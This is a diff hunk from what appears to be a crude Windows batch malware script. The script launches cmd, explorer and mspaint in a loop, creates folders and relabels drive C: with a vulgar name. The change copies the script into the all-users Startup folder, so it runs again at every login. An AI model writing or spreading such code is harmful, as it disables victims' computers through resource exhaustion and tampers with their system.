@@ -3,7 +3,7 @@
 Start cmd
 start explorer
 start mspaint
-copy %0 C:\
+copy %0 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 md Porno
 goto a
 label C:SysFuck
